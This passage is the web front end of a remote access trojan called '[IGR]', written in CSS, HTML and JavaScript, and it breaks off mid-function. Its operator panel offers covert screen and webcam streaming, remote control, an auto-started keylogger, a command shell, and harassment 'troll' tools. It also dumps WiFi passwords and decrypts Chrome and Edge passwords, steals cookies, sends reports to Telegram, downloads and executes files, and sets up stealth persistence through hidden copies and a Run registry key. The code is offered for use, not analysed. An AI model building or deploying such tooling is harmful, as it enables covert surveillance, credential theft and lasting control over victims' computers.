        /* Main Layout */
        .app-container { display: none; }
        .app-container.active { display: flex; }
        
        /* Sidebar */
        .sidebar {
            width: 260px;
            min-width: 260px;
            background: #0a0a0f;
            border-right: 2px solid #a855f7;
            height: 100vh;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            transition: all 0.3s ease;
        }
        .sidebar.collapsed {
            width: 60px;
            min-width: 60px;
        }
        .sidebar.collapsed .nav-text { display: none; }
        .sidebar.collapsed .nav-item { justify-content: center; padding: 18px; }
        .sidebar.collapsed .sidebar-logo { display: none; }
        .sidebar.collapsed .sidebar-header { justify-content: center; padding: 18px; }
        .sidebar-header {
            padding: 25px;
            border-bottom: 2px solid #a855f7;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .sidebar-logo {
            font-size: 28px;
            font-weight: bold;
            color: #a855f7;
            text-shadow: 0 0 15px #a855f7;
        }
        .sidebar-toggle {
            background: none;
            border: none;
            color: #a855f7;
            font-size: 20px;
            cursor: pointer;
            padding: 5px;
        }
        .sidebar.collapsed .sidebar-toggle { margin: 0 auto; }
        .sidebar-nav { flex: 1; padding: 15px 0; }
        .nav-item {
            padding: 18px 25px;
            cursor: pointer;
            border-left: 4px solid transparent;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 15px;
            font-size: 15px;
        }
        .nav-item:hover { background: rgba(168, 85, 247, 0.1); border-left-color: #a855f7; }
        .nav-item.active { background: rgba(168, 85, 247, 0.2); border-left-color: #a855f7; color: #fff; }
        .nav-icon { 
            font-size: 18px; 
            width: 28px; 
            text-align: center;
            font-weight: bold;
        }
        
        /* Main Content */
        .main-content {
            flex: 1;
            height: 100vh;
            overflow-y: auto;
            padding: 25px;
            display: flex;
            flex-direction: column;
        }
        .page { display: none; flex: 1; }
        .page.active { display: flex; flex-direction: column; }
        .page-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .page-grid .section { margin-bottom: 0; }
        
        /* Info Cards */
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .info-card {
            background: #0f0a1a;
            border: 2px solid #a855f7;
            border-radius: 8px;
            padding: 25px;
            text-align: center;
        }
        .info-label { font-size: 13px; color: #888; text-transform: uppercase; margin-bottom: 10px; }
        .info-value { font-size: 22px; color: #a855f7; font-weight: bold; }
        
        /* Section */
        .section {
            background: #0f0a1a;
            border: 2px solid #a855f7;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 25px;
            flex: 1;
            display: flex;
            flex-direction: column;
            min-height: 0;
        }
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #2a1a3a;
        }
        .section-title { font-size: 18px; font-weight: bold; color: #a855f7; text-transform: uppercase; }
        .section-header > div { display: flex; gap: 8px; flex-wrap: wrap; }
        
        /* Buttons */
        .btn {
            background: transparent;
            color: #a855f7;
            border: 2px solid #a855f7;
            padding: 12px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 15px;
            font-weight: bold;
            transition: all 0.3s;
            margin: 5px;
        }
        .btn:hover { background: #a855f7; color: #000; box-shadow: 0 0 20px #a855f7; }
        .btn.active { background: #a855f7; color: #000; }
        .btn.danger { border-color: #ef4444; color: #ef4444; }
        .btn.danger:hover { background: #ef4444; color: #000; }
        .btn.small { padding: 8px 16px; font-size: 13px; }
        
        /* Inputs */
        input, select, textarea {
            background: #0a0a0a;
            border: 2px solid #a855f7;
            border-radius: 4px;
            padding: 12px 16px;
            color: #c084fc;
            font-family: 'Courier New', monospace;
            font-size: 15px;
            width: 100%;
            margin-bottom: 12px;
        }
        input:focus, select:focus { outline: none; box-shadow: 0 0 15px #a855f7; }
        
        /* Log Box */
        .log-box {
            background: #050505;
            border: 2px solid #a855f7;
            border-radius: 6px;
            padding: 15px;
            min-height: 200px;
            flex: 1;
            overflow-y: auto;
            font-size: 14px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        /* Stream Box */
        .stream-box {
            background: #050505;
            border: 2px solid #a855f7;
            border-radius: 8px;
            min-height: 400px;
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }
        .stream-box img { max-width: 100%; max-height: 100%; object-fit: contain; }
        .stream-box.fullscreen {
            position: fixed; top: 0; left: 0;
            width: 100vw; height: 100vh;
            z-index: 9999; border: none; border-radius: 0;
        }
        .stream-badge {
            position: absolute; top: 15px; right: 15px;
            background: rgba(168, 85, 247, 0.9);
            color: #000;
            padding: 8px 16px;
            border-radius: 4px;
            font-size: 13px;
            font-weight: bold;
            z-index: 10;
        }
        .fullscreen-btn {
            position: absolute; top: 15px; left: 15px;
            background: rgba(168, 85, 247, 0.9);
            color: #000;
            border: none;
            padding: 10px 16px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            z-index: 10;
        }
        
        /* File Browser */
        .file-path-bar { display: flex; gap: 15px; margin-bottom: 20px; }
        .file-path-bar input { flex: 1; }
        .file-list {
            background: #050505;
            border: 2px solid #a855f7;
            border-radius: 6px;
            flex: 1;
            overflow-y: auto;
        }
        .file-item {
            padding: 14px 20px;
            border-bottom: 1px solid #2a1a3a;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .file-item:hover { background: rgba(168, 85, 247, 0.1); }
        .file-item:last-child { border-bottom: none; }
        .file-icon { color: #a855f7; }
        
        /* Mobile */
        @media (max-width: 768px) {
            .sidebar { width: 50px; min-width: 50px; }
            .sidebar.collapsed { width: 50px; min-width: 50px; }
            .sidebar-logo { font-size: 14px; }
            .sidebar-header { padding: 12px 8px; }
            .sidebar-toggle { display: none; }
            .nav-item { padding: 12px 8px; justify-content: center; font-size: 12px; }
            .nav-text { display: none; }
            .nav-icon { font-size: 14px; width: 20px; }
            .main-content { padding: 12px; }
            .info-grid { grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
            .info-card { padding: 12px; }
            .info-label { font-size: 10px; margin-bottom: 5px; }
            .info-value { font-size: 16px; }
            .section { padding: 12px; margin-bottom: 12px; }
            .page-grid { grid-template-columns: 1fr; }
            .section-header { margin-bottom: 10px; padding-bottom: 8px; }
            .section-title { font-size: 14px; }
            .btn { padding: 8px 14px; font-size: 12px; }
            .btn.small { padding: 6px 10px; font-size: 11px; }
            input, select, textarea { padding: 8px 10px; font-size: 13px; }
            .log-box { min-height: 120px; font-size: 12px; padding: 10px; }
            .stream-box { min-height: 200px; }
            .stream-badge { padding: 4px 10px; font-size: 10px; top: 8px; right: 8px; }
            .fullscreen-btn { padding: 6px 10px; font-size: 12px; top: 8px; left: 8px; }
            .file-item { padding: 10px 12px; font-size: 13px; }
            .file-path-bar { gap: 8px; margin-bottom: 10px; }
            .login-box { padding: 30px; width: 90%; max-width: 320px; }
            .login-title { font-size: 32px; }
            .login-input { font-size: 14px; padding: 10px; width: 100%; }
            .login-btn { font-size: 14px; padding: 10px; }
        }
        @media (max-width: 480px) {
            .sidebar { width: 40px; min-width: 40px; }
            .sidebar.collapsed { width: 40px; min-width: 40px; }
            .nav-item { padding: 10px 6px; }
            .nav-icon { font-size: 12px; }
            .main-content { padding: 8px; }
            .info-grid { grid-template-columns: 1fr; gap: 8px; }
            .info-card { padding: 10px; }
            .info-value { font-size: 14px; }
            .section { padding: 10px; }
            .section-title { font-size: 12px; }
            .btn { padding: 7px 10px; font-size: 11px; }
            input, select, textarea { padding: 7px 8px; font-size: 12px; }
            .log-box { min-height: 100px; font-size: 11px; }
            .stream-box { min-height: 150px; }
            .login-box { padding: 20px; }
            .login-title { font-size: 26px; }
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0a0a0f; }
        ::-webkit-scrollbar-thumb { background: #a855f7; border-radius: 4px; }
    </style>
</head>
<body>
    <!-- Login Screen -->
    <div class="login-screen" id="loginScreen">
        <div class="login-box">
            <div class="login-title">[IGR]</div>
            <input type="password" class="login-input" id="passwordInput" placeholder="Enter password" onkeypress="if(event.key==='Enter')attemptLogin()">
            <br>
            <button class="login-btn" onclick="attemptLogin()">ACCESS</button>
            <div class="login-error" id="loginError">Invalid password</div>
        </div>
    </div>

    <!-- Main App -->
    <div class="app-container" id="appContainer">
        <!-- Sidebar -->
        <div class="sidebar" id="sidebar">
            <div class="sidebar-header">
                <div class="sidebar-logo">[IGR]</div>
                <button class="sidebar-toggle" onclick="toggleSidebar()">[&lt;&gt;]</button>
            </div>
            <div class="sidebar-nav">
                <div class="nav-item active" onclick="showPage('home')"><span class="nav-icon">[H]</span><span class="nav-text">Home</span></div>
                <div class="nav-item" onclick="showPage('screen')"><span class="nav-icon">[S]</span><span class="nav-text">Screen</span></div>
                <div class="nav-item" onclick="showPage('webcam')"><span class="nav-icon">[W]</span><span class="nav-text">Webcam</span></div>
                <div class="nav-item" onclick="showPage('control')"><span class="nav-icon">[C]</span><span class="nav-text">Control</span></div>
                <div class="nav-item" onclick="showPage('keylogger')"><span class="nav-icon">[K]</span><span class="nav-text">Keylogger</span></div>
                <div class="nav-item" onclick="showPage('files')"><span class="nav-icon">[F]</span><span class="nav-text">Files</span></div>
                <div class="nav-item" onclick="showPage('shell')"><span class="nav-icon">[$]</span><span class="nav-text">Shell</span></div>
                <div class="nav-item" onclick="showPage('troll')"><span class="nav-icon">[T]</span><span class="nav-text">Troll</span></div>
                <div class="nav-item" onclick="showPage('harvest')"><span class="nav-icon">[D]</span><span class="nav-text">Harvest</span></div>
                <div class="nav-item" onclick="showPage('remote')"><span class="nav-icon">[R]</span><span class="nav-text">Remote</span></div>
                <div class="nav-item" onclick="showPage('stealth')"><span class="nav-icon">[X]</span><span class="nav-text">Stealth</span></div>
            </div>
        </div>

        <!-- Main Content -->
        <div class="main-content">
            <!-- Home Page -->
            <div class="page active" id="page-home">
                <div class="info-grid">
                    <div class="info-card"><div class="info-label">Host IP</div><div class="info-value" id="hostIp">Loading...</div></div>
                    <div class="info-card"><div class="info-label">Your IP</div><div class="info-value" id="clientIp">Loading...</div></div>
                    <div class="info-card"><div class="info-label">Hostname</div><div class="info-value" id="hostname">Loading...</div></div>
                    <div class="info-card"><div class="info-label">OS</div><div class="info-value" id="osInfo">Loading...</div></div>
                    <div class="info-card"><div class="info-label">Monitors</div><div class="info-value" id="monitorCountHome">-</div></div>
                    <div class="info-card"><div class="info-label">Public URL</div><div class="info-value" id="cloudflaredUrl" style="font-size:14px;word-break:break-all;">Loading...</div></div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Hardware Status</div><button class="btn small" onclick="checkHardware()">Refresh</button></div>
                    <div class="info-grid">
                        <div class="info-card"><div class="info-label">Webcams</div><div class="info-value" id="webcamCount">-</div></div>
                        <div class="info-card"><div class="info-label">Microphones</div><div class="info-value" id="micCount">-</div></div>
                        <div class="info-card"><div class="info-label">Screens</div><div class="info-value" id="screenCountHome">-</div></div>
                        <div class="info-card"><div class="info-label">Speakers</div><div class="info-value">Available</div></div>
                    </div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">System Info</div></div>
                    <div id="systemInfo" style="line-height: 1.8;">Loading...</div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Activity Log</div><button class="btn small" onclick="clearActivity()">Clear</button></div>
                    <div class="log-box" id="activityLog"></div>
                </div>
            </div>

            <!-- Screen Page -->
            <div class="page" id="page-screen">
                <div class="section">
                    <div class="section-header"><div class="section-title">Screen Stream</div><div><button class="btn" id="screenBtn" onclick="toggleScreen()">Start Stream</button><button class="btn" onclick="captureScreen()">Capture</button><button class="btn small" onclick="detectMonitors()">Detect Monitors</button></div></div>
                    <div id="monitorSelect" style="margin-bottom: 15px; display: none;">
                        <select id="monitorDropdown" onchange="currentMonitor=this.value" style="margin-bottom: 0;"><option value="-1">All Monitors</option></select>
                    </div>
                    <div class="stream-box" id="screenBox">
                        <button class="fullscreen-btn" onclick="toggleFullscreen('screenBox')">[+]</button>
                        <img id="screenStream" src="" style="display:none;">
                        <div class="stream-badge" id="screenBadge" style="display:none;">LIVE</div>
                    </div>
                    <div id="monitorGrid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; margin-top: 15px;"></div>
                </div>
            </div>

            <!-- Webcam Page -->
            <div class="page" id="page-webcam">
                <div class="section">
                    <div class="section-header"><div class="section-title">Webcam Stream</div><button class="btn" id="webcamBtn" onclick="toggleWebcam()">Start Stream</button></div>
                    <select id="webcamSelect" style="margin-bottom: 15px;"><option value="">Loading...</option></select>
                    <div class="stream-box" id="webcamBox">
                        <button class="fullscreen-btn" onclick="toggleFullscreen('webcamBox')">[+]</button>
                        <img id="webcamStream" src="" style="display:none;">
                        <div class="stream-badge" id="webcamBadge" style="display:none;">LIVE</div>
                    </div>
                </div>
            </div>

            <!-- Control Page -->
            <div class="page" id="page-control">
                <div class="section">
                    <div class="section-header"><div class="section-title">Mouse & Keyboard Control</div><button class="btn" id="controlBtn" onclick="toggleControl()">Start Control</button></div>
                    <div class="stream-box" id="controlBox" style="cursor: crosshair;">
                        <button class="fullscreen-btn" onclick="toggleFullscreen('controlBox')">[+]</button>
                        <img id="controlStream" src="" style="display:none; width: 100%; height: 100%;">
                        <div class="stream-badge" id="controlBadge" style="display:none;">CONTROLLING</div>
                    </div>
                    <div style="margin-top: 15px;">
                        <input type="text" id="typeText" placeholder="Type text on host...">
                        <button class="btn" onclick="typeOnHost()" style="width: 100%;">Type on Host</button>
                    </div>
                </div>
            </div>

            <!-- Keylogger Page -->
            <div class="page" id="page-keylogger">
                <div class="section">
                    <div class="section-header"><div class="section-title">Host Keylogger</div><div><button class="btn small" onclick="downloadKeylogs()">Download All Logs</button><button class="btn small" onclick="clearKeylog()">Clear</button></div></div>
                    <div style="margin-bottom: 15px; display: flex; gap: 20px; flex-wrap: wrap;">
                        <div><strong>Path:</strong> <span id="keylogPath">Loading...</span></div>
                        <div><strong>Size:</strong> <span id="keylogSize">0 B</span></div>
                    </div>
                    <div class="log-box" id="keylogBox">Loading...</div>
                </div>
            </div>

            <!-- Files Page -->
            <div class="page" id="page-files">
                <div class="section">
                    <div class="section-header"><div class="section-title">File Browser</div><div><button class="btn small" onclick="downloadFile()">Download</button><button class="btn small" onclick="document.getElementById('fileInput').click()">Upload</button><input type="file" id="fileInput" style="display:none;" onchange="uploadFile()"></div></div>
                    <div class="file-path-bar"><input type="text" id="filePath" placeholder="Path (e.g., C:\Users\...)"><button class="btn" onclick="listFiles()">Browse</button></div>
                    <div class="file-list" id="fileList"></div>
                </div>
            </div>

            <!-- Shell Page -->
            <div class="page" id="page-shell">
                <div class="section">
                    <div class="section-header"><div class="section-title">Command Shell</div></div>
                    <input type="text" id="commandInput" placeholder="Enter command...">
                    <button class="btn" onclick="executeCommand()" style="width: 100%;">Execute</button>
                    <div class="log-box" id="shellOutput" style="margin-top: 15px;">Output will appear here...</div>
                </div>
            </div>

            <!-- Troll Page -->
            <div class="page" id="page-troll">
                <div class="page-grid">
                <div class="section">
                    <div class="section-header"><div class="section-title">Windows Popups</div></div>
                    <input type="text" id="popupTitle" placeholder="Popup title..." style="margin-bottom: 10px;">
                    <input type="text" id="popupText" placeholder="Popup message..." style="margin-bottom: 15px;">
                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                        <button class="btn" onclick="sendPopup('normal')" style="flex: 1;">Normal</button>
                        <button class="btn danger" onclick="sendPopup('persistent')" style="flex: 1;">Persistent</button>
                        <button class="btn danger" onclick="sendPopup('hydra')" style="flex: 1;">Hydra</button>
                    </div>
                    <button class="btn" onclick="stopPopups()" style="width: 100%; margin-top: 10px;">Stop All</button>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Screen Freeze</div></div>
                    <button class="btn danger" onclick="freezeScreen('black')" style="width: 100%; margin-bottom: 10px;">Freeze (Black)</button>
                    <input type="file" id="freezeImageInput" accept="image/*" style="margin-bottom: 10px;">
                    <button class="btn" onclick="freezeScreenImg()" style="width: 100%; margin-bottom: 10px;">Freeze with Image</button>
                    <button class="btn" onclick="unfreezeScreen()" style="width: 100%;">Unfreeze</button>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Audio</div></div>
                    <input type="text" id="ttsText" placeholder="Text to speak...">
                    <button class="btn" onclick="speakText()" style="width: 100%; margin-bottom: 10px;">Speak</button>
                    <input type="file" id="audioFileInput" accept="audio/*" style="margin-bottom: 10px;">
                    <div style="display: flex; gap: 10px;">
                        <button class="btn" onclick="playAudio()" style="flex: 1;">Play</button>
                        <button class="btn danger" onclick="stopAudio()" style="flex: 1;">Stop</button>
                    </div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Mouse Jitter</div></div>
                    <div style="display: flex; gap: 10px;">
                        <button class="btn danger" onclick="startJitter()" style="flex: 1;">Start</button>
                        <button class="btn" onclick="stopJitter()" style="flex: 1;">Stop</button>
                    </div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Ghost Typing</div></div>
                    <input type="text" id="ghostText" placeholder="Text to type...">
                    <div style="display: flex; gap: 10px;">
                        <input type="number" id="ghostInterval" value="2" step="0.5" min="0.5" placeholder="Secs" style="flex: 1;">
                        <input type="number" id="ghostCount" value="1" min="1" placeholder="Count" style="flex: 1;">
                    </div>
                    <button class="btn danger" onclick="ghostType()" style="width: 100%;">Ghost Type</button>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Wallpaper</div></div>
                    <input type="file" id="wallpaperInput" accept="image/*" style="margin-bottom: 10px;">
                    <button class="btn" onclick="changeWallpaper()" style="width: 100%;">Change</button>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Monitor</div></div>
                    <div style="display: flex; gap: 10px;">
                        <button class="btn danger" onclick="monitorOff()" style="flex: 1;">Turn Off</button>
                        <button class="btn" onclick="monitorOn()" style="flex: 1;">Turn On</button>
                    </div>
                </div>
                </div>
            </div>

            <!-- Harvest Page -->
            <div class="page" id="page-harvest">
                <div class="page-grid">
                <div class="section">
                    <div class="section-header"><div class="section-title">WiFi Passwords</div><button class="btn small" onclick="harvestWifi()">Dump</button></div>
                    <div class="log-box" id="wifiBox">Click Dump to extract saved WiFi passwords...</div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Chrome Passwords</div><button class="btn small" onclick="harvestChrome()">Decrypt</button></div>
                    <div class="log-box" id="chromeBox">Click Decrypt to extract Chrome saved passwords...</div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Edge Passwords</div><button class="btn small" onclick="harvestEdge()">Decrypt</button></div>
                    <div class="log-box" id="edgeBox">Click Decrypt to extract Edge saved passwords...</div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Browser Cookies</div><button class="btn small" onclick="harvestCookies()">Steal</button></div>
                    <div class="log-box" id="cookiesBox">Click Steal to extract browser cookies...</div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Installed Software</div><button class="btn small" onclick="harvestSoftware()">List</button></div>
                    <div class="log-box" id="softwareBox">Click List to get installed software...</div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Recent Documents</div><button class="btn small" onclick="harvestRecent()">Get</button></div>
                    <div class="log-box" id="recentBox">Click Get to list recent documents...</div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">System Inventory</div><button class="btn small" onclick="harvestInventory()">Scan</button></div>
                    <div id="inventoryGrid" class="info-grid" style="display:none;"></div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Send to Telegram</div></div>
                    <input type="text" id="telegramMsg" placeholder="Custom message or leave blank for auto-report">
                    <button class="btn" onclick="sendToTelegram()" style="width: 100%;">Send Report</button>
                </div>
                </div>
            </div>

            <!-- Remote Page -->
            <div class="page" id="page-remote">
                <div class="page-grid">
                <div class="section">
                    <div class="section-header"><div class="section-title">Download & Execute</div></div>
                    <input type="text" id="dlUrl" placeholder="URL to download...">
                    <button class="btn danger" onclick="downloadExec()" style="width: 100%;">Download & Run</button>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Self Update</div></div>
                    <button class="btn" onclick="selfUpdate()" style="width: 100%;">Update from configured URL</button>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">File Search</div></div>
                    <input type="text" id="searchRoot" value="C:\\" placeholder="Root directory...">
                    <input type="text" id="searchPattern" placeholder="Filename pattern (e.g. .pdf, passwords)">
                    <button class="btn" onclick="searchFiles()" style="width: 100%;">Search</button>
                    <div class="log-box" id="searchBox" style="margin-top: 10px;">Results appear here...</div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Open Browser</div></div>
                    <input type="text" id="browserUrl" placeholder="URL to open...">
                    <button class="btn" onclick="openBrowser()" style="width: 100%;">Open</button>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Kill Process</div></div>
                    <input type="text" id="killProcess" placeholder="Process name (e.g. explorer.exe)">
                    <button class="btn danger" onclick="killProcess()" style="width: 100%;">Kill</button>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">LAN Scanner</div><button class="btn small" onclick="scanLan()">Scan</button></div>
                    <div class="log-box" id="lanBox">Click Scan to discover devices on local network...</div>
                </div>
                </div>
            </div>

            <!-- Stealth Page -->
            <div class="page" id="page-stealth">
                <div class="page-grid">
                <div class="section">
                    <div class="section-header"><div class="section-title">Internal Spread</div><button class="btn small" onclick="stealthSpread()">Spread Now</button></div>
                    <div class="log-box" id="spreadBox">Copies exe to multiple hidden locations with different names. If one copy is found and deleted, others survive.</div>
                </div>
                <div class="section">
                    <div class="section-header"><div class="section-title">Registry Persistence</div><button class="btn small" onclick="stealthRegistry()">Add Key</button></div>
                    <div class="log-box" id="registryBox">Adds HKCU Run key so IGR starts on login. No admin required.</div>
                </div>
                <div class="section" style="grid-column: 1 / -1;">
                    <div class="section-header"><div class="section-title">Current Persistence</div></div>
                    <div id="persistenceInfo" style="line-height: 1.8;">Loading...</div>
                </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Auth
        function attemptLogin() {
            const pwd = document.getElementById('passwordInput').value;
            fetch('/api/auth', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({password: pwd})})
            .then(r => r.json()).then(data => {
                if (data.success) {
                    document.getElementById('loginScreen').style.display = 'none';
                    document.getElementById('appContainer').classList.add('active');
                    initApp();
                } else {
                    document.getElementById('loginError').style.display = 'block';
                }
            });
        }

        // Navigation
        function toggleSidebar() {
            document.getElementById('sidebar').classList.toggle('collapsed');
        }
        function showPage(name) {
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelector(`.nav-item[onclick="showPage('${name}')"]`).classList.add('active');
            document.getElementById('page-' + name).classList.add('active');
            logActivity('Opened ' + name);
        }

        // State
        let screenInterval, webcamInterval, controlInterval, keylogInterval;
        let isScreenOn = false, isWebcamOn = false, isControlOn = false, isKeyloggerOn = false;
        let currentMonitor = -1;
        let monitorCount = 0;

        // Logging
        function logActivity(msg) {
            const log = document.getElementById('activityLog');
            const time = new Date().toLocaleTimeString('en-US', {hour12: false});
            log.textContent += `[${time}] ${msg}
`;
            log.scrollTop = log.scrollHeight;
        }
        function clearActivity() { document.getElementById('activityLog').textContent = ''; }

        // Init
        function initApp() { loadNetworkInfo(); checkHardware(); getSystemInfo(); startKeylogger(); detectMonitors(); loadPersistenceInfo(); }

        // Network Info
        async function loadNetworkInfo() {
            const res = await fetch('/api/network/info');
            const data = await res.json();
            document.getElementById('hostIp').textContent = data.host_ip;
            document.getElementById('clientIp').textContent = data.client_ip;
            document.getElementById('hostname').textContent = data.hostname;
            document.getElementById('cloudflaredUrl').textContent = data.cloudflared_url || 'Not available';
        }

        // Hardware
        async function checkHardware() {
            const res = await fetch('/api/hardware/list');
            const data = await res.json();
            document.getElementById('webcamCount').textContent = data.webcams.length || 'None';
            document.getElementById('micCount').textContent = data.microphones.length || 'None';
            document.getElementById('webcamSelect').innerHTML = data.webcams.map((w, i) => `<option value="${i}">${w}</option>`).join('') || '<option>None</option>';
            document.getElementById('osInfo').textContent = data.system || 'Windows';
            logActivity('Hardware checked');
        }

        // System Info
        async function getSystemInfo() {
            const res = await fetch('/api/system/info');
            const data = await res.json();
            document.getElementById('osInfo').textContent = data.system;
            document.getElementById('systemInfo').innerHTML = `<strong>System:</strong> ${data.system}<br><strong>Node:</strong> ${data.node}<br><strong>Release:</strong> ${data.release}<br><strong>Machine:</strong> ${data.machine}<br><strong>Processor:</strong> ${data.processor || 'N/A'}`;
        }

        // Screen
        async function detectMonitors() {
            const res = await fetch('/api/screen/monitors');
            const data = await res.json();
            monitorCount = data.count;
            const sel = document.getElementById('monitorDropdown');
            sel.innerHTML = '<option value="-1">All Monitors</option>';
            data.monitors.forEach((m, i) => {
                sel.innerHTML += `<option value="${i}">Monitor ${i+1} (${m.width}x${m.height})</option>`;
            });
            document.getElementById('monitorSelect').style.display = monitorCount > 1 ? 'block' : 'none';
            document.getElementById('monitorCountHome').textContent = monitorCount;
            document.getElementById('screenCountHome').textContent = monitorCount;
            
            // Build individual monitor preview grid
            const grid = document.getElementById('monitorGrid');
            grid.innerHTML = '';
            if (monitorCount > 1) {
                data.monitors.forEach((m, i) => {
                    grid.innerHTML += `
                        <div class="section" style="padding: 10px;">
                            <div class="section-header" style="margin-bottom: 8px;"><div class="section-title" style="font-size: 13px;">Monitor ${i+1} (${m.width}x${m.height})</div><button class="btn small" onclick="streamMonitor(${i})">Stream</button></div>
                            <div class="stream-box" id="monBox${i}" style="height: 200px;">
                                <button class="fullscreen-btn" onclick="toggleFullscreen('monBox${i}')" style="padding: 6px 10px; font-size: 12px;">[+]</button>
                                <img id="monStream${i}" src="" style="display:none;">
                            </div>
                        </div>`;
                });
            }
            logActivity(`Detected ${monitorCount} monitor(s)`);
        }
        let monitorIntervals = {};
        async function streamMonitor(id) {
            if (monitorIntervals[id]) {
                clearInterval(monitorIntervals[id]);
                delete monitorIntervals[id];
                document.getElementById(`monStream${id}`).style.display = 'none';
                logActivity(`Monitor ${id+1} stream stopped`);
            } else {
                document.getElementById(`monStream${id}`).style.display = 'block';
                monitorIntervals[id] = setInterval(async () => {
                    const res = await fetch(`/api/screen/stream?monitor=${id}`);
                    const blob = await res.blob();
                    document.getElementById(`monStream${id}`).src = URL.createObjectURL(blob);
                }, 200);
                logActivity(`Monitor ${id+1} stream started`);
            }
        }
        async function toggleScreen() {
            if (isScreenOn) {
                clearInterval(screenInterval);
                document.getElementById('screenStream').style.display = 'none';
                document.getElementById('screenBadge').style.display = 'none';
                document.getElementById('screenBtn').textContent = 'Start Stream';
                document.getElementById('screenBtn').classList.remove('active');
                isScreenOn = false;
                logActivity('Screen stream stopped');
            } else {
                document.getElementById('screenStream').style.display = 'block';
                document.getElementById('screenBadge').style.display = 'block';
                document.getElementById('screenBtn').textContent = 'Stop Stream';
                document.getElementById('screenBtn').classList.add('active');
                isScreenOn = true;
                screenInterval = setInterval(async () => {
                    const res = await fetch(`/api/screen/stream?monitor=${currentMonitor}`);
                    const blob = await res.blob();
                    document.getElementById('screenStream').src = URL.createObjectURL(blob);
                }, 200);
                logActivity('Screen stream started');
            }
        }
        async function captureScreen() {
            const res = await fetch(`/api/screen/capture?monitor=${currentMonitor}`);
            const blob = await res.blob();
            document.getElementById('screenStream').style.display = 'block';
            document.getElementById('screenStream').src = URL.createObjectURL(blob);
            logActivity('Screen captured');
        }

        // Webcam
        async function toggleWebcam() {
            if (isWebcamOn) {
                clearInterval(webcamInterval);
                document.getElementById('webcamStream').style.display = 'none';
                document.getElementById('webcamBadge').style.display = 'none';
                document.getElementById('webcamBtn').textContent = 'Start Stream';
                document.getElementById('webcamBtn').classList.remove('active');
                isWebcamOn = false;
                await fetch('/api/webcam/stop', {method: 'POST'});
                logActivity('Webcam stream stopped');
            } else {
                document.getElementById('webcamStream').style.display = 'block';
                document.getElementById('webcamBadge').style.display = 'block';
                document.getElementById('webcamBtn').textContent = 'Stop Stream';
                document.getElementById('webcamBtn').classList.add('active');
                isWebcamOn = true;
                webcamInterval = setInterval(async () => {
                    const cam = document.getElementById('webcamSelect').value || 0;
                    try {
                        const res = await fetch(`/api/webcam/stream?cam=${cam}`);
                        if (res.ok) { const blob = await res.blob(); document.getElementById('webcamStream').src = URL.createObjectURL(blob); }
                    } catch(e) {}
                }, 300);
                logActivity('Webcam stream started');
            }
        }

        // Control
        async function toggleControl() {
            if (isControlOn) {
                clearInterval(controlInterval);
                document.getElementById('controlStream').style.display = 'none';
                document.getElementById('controlBadge').style.display = 'none';
                document.getElementById('controlBtn').textContent = 'Start Control';
                document.getElementById('controlBtn').classList.remove('active');
                const box = document.getElementById('controlBox');
                box.onclick = null; box.oncontextmenu = null;
                isControlOn = false;
                logActivity('Control stopped');
            } else {
                const box = document.getElementById('controlBox');
                document.getElementById('controlStream').style.display = 'block';
                document.getElementById('controlBadge').style.display = 'block';
                document.getElementById('controlBtn').textContent = 'Stop Control';
                document.getElementById('controlBtn').classList.add('active');
                isControlOn = true;
                box.onclick = async (e) => {
                    const rect = box.getBoundingClientRect();
                    const x = Math.round((e.clientX - rect.left) / rect.width * 1920);
                    const y = Math.round((e.clientY - rect.top) / rect.height * 1080);
                    await fetch('/api/control/mouse', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: 'move', x, y})});
